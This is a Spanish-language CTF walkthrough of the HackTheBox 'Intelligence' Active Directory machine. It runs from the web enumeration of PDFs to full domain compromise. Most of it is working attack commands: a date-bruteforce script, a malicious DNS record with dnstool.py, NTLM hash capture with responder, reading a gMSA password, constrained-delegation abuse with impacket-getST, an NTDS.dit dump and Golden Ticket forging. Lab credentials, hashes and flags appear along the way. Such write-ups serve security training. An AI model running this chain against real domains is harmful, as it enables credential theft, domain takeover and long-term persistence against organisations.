ENUMERACIÓN WEB — PDFs por fecha de subida

Tras probar la enumeración típica de AD sin resultado, se revisa la web. En /documents hay varios ficheros con nombre YYYY-MM-DD-upload.pdf, todos con contenido lorem ipsum de relleno. Como el patrón de nombre es predecible, se escribe un script que prueba todas las fechas entre 2020 y 2026 contra ese patrón y descarga los PDFs que respondan 200 OK.

fetch_pdfs.sh — fuerza bruta de fechas
BASE_URL="http://intelligence.htb/documents" START_DATE="2020-01-01" END_DATE="2026-12-31" while [ "$current_ts" -le "$end_ts" ]; do fecha=$(date -d "@$current_ts" +%Y-%m-%d) url="${BASE_URL}/${fecha}-upload.pdf" status=$(curl -s -o /dev/null -w "%{http_code}" "$url") if [ "$status" == "200" ]; then curl -s -o "${OUTPUT_DIR}/${fecha}-upload.pdf" "$url" fi current_ts=$((current_ts + 86400)) done for f in *.pdf; do pdftotext "$f" "${f%.pdf}.txt"; done
Decenas de PDFs recuperados
El script encuentra bastantes ficheros (2020-01-01-upload.pdf, 2020-01-02-upload.pdf...). Se convierten todos a texto plano con pdftotext para poder buscar dentro cómodamente.

En el share IT aparece un script downdetector.ps1 ejecutado por una tarea programada cada 5 minutos bajo el usuario Ted.Graves.

downdetector.ps1
# Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*") { try { $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials if($request.StatusCode -ne 200) { Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down" } } catch {} }
Qué hace el script
Cada 5 minutos consulta la zona DNS interna del AD en busca de todos los hosts cuyo nombre empieza por web, y hace una petición HTTP a cada uno usando las credenciales de la cuenta bajo la que corre el proceso (-UseDefaultCredentials, es decir, autenticación NTLM/Kerberos automática). Si algún host no responde 200, avisa por correo a Ted.Graves.
// 06

CAPTURA NTLM — Registro DNS malicioso y responder

Como el script hace peticiones a cualquier host que empiece por web dentro de la zona DNS interna, se puede añadir un registro DNS falso que apunte a nuestra IP. Como Tiffany.Molina tiene permisos de escritura en la zona DNS (comportamiento por defecto en AD), se usa krbrelayx (dnstool.py) para crear el registro.

registro dns malicioso
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r web-evil.intelligence.htb -a add -t A -d 10.10.15.51 10.129.95.154

Se pone en escucha responder para capturar la autenticación NTLM entrante.

captura con responder
sudo responder -I tun0 -wv
Hash NTLMv2 de Ted.Graves capturado
Cuando la tarea programada se ejecuta, hace una petición a web-evil.intelligence.htb autenticándose como Ted.Graves, y responder captura su hash NTLMv2. Se crackea con hashcat y la contraseña resulta ser Mr.Teddy.
// 07

BLOODHOUND — ReadGMSAPassword y AllowedToDelegate

Con dos cuentas de dominio, se lanza bloodhound-python para mapear el camino hacia el dominio.

recolección de datos con bloodhound
bloodhound-python -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -ns 10.129.95.154 -c all --zip

Subiendo los datos a BloodHound, el camino desde Ted.Graves hasta el dominio queda así de claro:

grafo de ataque — bloodhound
Cadena de abuso hacia Domain Admin
1. Ted.Graves pertenece al grupo ITSUPPORT, que tiene el permiso ReadGMSAPassword sobre la cuenta de servicio gestionada SVC_INT$.

2. La cuenta SVC_INT$ tiene AllowedToDelegate (constrained delegation con protocol transition) sobre el servicio WWW del propio DC, lo que permite pedir tickets como cualquier usuario del dominio hacia ese servicio.

Se lee la contraseña de la gMSA con nxc.

lectura de contraseña gmsa
nxc ldap 10.129.95.154 -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
Hash NTLM de svc_int$
Se obtiene el hash NTLM de la cuenta gMSA svc_int$: 4de450f51af61cf1e67e982965aca00c.
// 08

DELEGACIÓN RESTRINGIDA — S4U2Self / S4U2Proxy como Administrator

Se busca la delegación configurada para svc_int$ con impacket-findDelegation.

búsqueda de delegación
impacket-findDelegation 'intelligence.htb/Ted.Graves:Mr.Teddy' -dc-ip 10.129.95.154
AccountName AccountType DelegationType DelegationRightsTo SPN Exists ----------- ----------- -------------- ----------------- ---------- DC$ Computer Unconstrained N/A Yes svc_int$ ms-DS-Group-Managed-Service-A Constrained w/ Protocol Transit WWW/dc.intelligence.htb No
¿Qué es la constrained delegation con protocol transition?
Permite que svc_int$ obtenga un ticket de servicio hacia WWW/dc.intelligence.htb en nombre de cualquier usuario, sin que ese usuario se autentique previamente (S4U2Self + S4U2Proxy). Combinado con el hash de svc_int$, esto permite suplantar a Administrator frente a ese servicio concreto del DC.

Se pide un ticket como Administrator para el servicio cifs del DC, abusando de la delegación de svc_int$.

abuso de constrained delegation
impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate Administrator -altservice 'cifs' -dc-ip 10.129.95.154 'intelligence.htb/svc_int$' -hashes aad3b435b51404eeaad3b435b51404ee:4de450f51af61cf1e67e982965aca00c

Se importa el ticket obtenido y se accede al DC como Administrator.

importación del ticket y acceso
export KRB5CCNAME=Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache impacket-wmiexec -k -no-pass dc.intelligence.htb
ADMIN FLAG 4e9a46b29a183bf9e6e67b194f415334

GOLDEN TICKET — Persistencia con el hash de krbtgt

Con privilegios de administrador del dominio, se vuelca el NTDS.dit completo.

volcado de ntds.dit
nxc smb dc.intelligence.htb -k --use-kcache --ntds
Hash de krbtgt volcado
Entre los hashes volcados está el de la cuenta krbtgt: 9ce5f83a494226352bca637e8c1d6cb6. Con este hash se puede forjar un Golden Ticket para tener persistencia como Administrador durante años sin depender de ninguna contraseña.

Se obtiene el SID del dominio desde BloodHound (S-1-5-21-4210132550-3389855604-3437519686) y se genera el ticket con impacket-ticketer.

generación del golden ticket
impacket-ticketer -nthash 9ce5f83a494226352bca637e8c1d6cb6 -domain-sid S-1-5-21-4210132550-3389855604-3437519686 -domain intelligence.htb Administrator
importación del ticket
export KRB5CCNAME=Administrator.ccache
Ticket válido durante 10 años
Al inspeccionar el ticket con impacket-describeTicket se confirma una validez de 10 años (RenewTill), lo que da persistencia total sobre el dominio con este ticket forjado, sin necesidad de ninguna contraseña.
